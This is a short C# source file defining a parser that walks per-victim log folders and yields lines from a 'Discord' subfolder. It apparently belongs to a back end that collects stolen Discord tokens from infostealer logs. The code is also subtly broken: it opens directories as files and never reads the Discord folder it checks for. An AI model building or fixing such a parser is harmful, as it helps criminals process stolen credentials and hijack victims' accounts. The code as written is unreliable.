using Server.Models.Abstract;

namespace Server.Parsers;

public sealed class DiscordTokensMultipleParser : IMultipleParser<string>
{
    public IAsyncEnumerable<string> FromLogs(string logs) =>
        Directory.GetDirectories(logs)
                 .ToAsyncEnumerable()
                 .SelectMany(FromLog);

    public async IAsyncEnumerable<string> FromLog(string log)
    {
        var path = Path.Combine(log, "Discord");
        
        if (!Directory.Exists(path))
            yield break;
        
        foreach (var filepath in Directory.GetDirectories(log))
            using (var file = File.OpenRead(filepath))
                using (var reader = new StreamReader(file))
                    while (!reader.EndOfStream)
                    {
                        yield return await reader.ReadLineAsync() ?? "";
                    }
    }
}